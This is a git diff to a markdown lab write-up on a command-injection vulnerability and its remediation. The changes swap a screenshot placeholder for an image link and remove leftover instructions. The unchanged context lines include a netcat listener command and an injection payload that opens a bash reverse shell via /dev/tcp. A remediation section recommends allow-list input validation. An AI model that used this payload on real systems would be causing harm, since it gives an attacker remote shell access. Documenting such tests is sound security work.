@@ -62,7 +62,7 @@ _Kali Listener_: nc -lvnp 4444
 
 _Payload_: 127.0.0.1; bash -c 'bash -i >& /dev/tcp//4444 0>&1'
 
-\[INSERT SCREENSHOT: Kali terminal showing the active reverse shell connection\]
+![proof image](images/reverse_shell.png)
 
 ### 5. The Remediation (The "After")
 
@@ -132,7 +132,3 @@ _Result_: The application blocked the input via the Regex filter, and even if by
 **Trust but Verify**: Always validate input against a strict "allow-list" rather than trying to "deny-list" specific bad characters.
 
 #### **Final Project Status**: SECURED ✅
-
-Add your screenshots in the places marked \[INSERT SCREENSHOT\].
-
-git add ., git commit -m "Finalizing documentation", git push origin main.
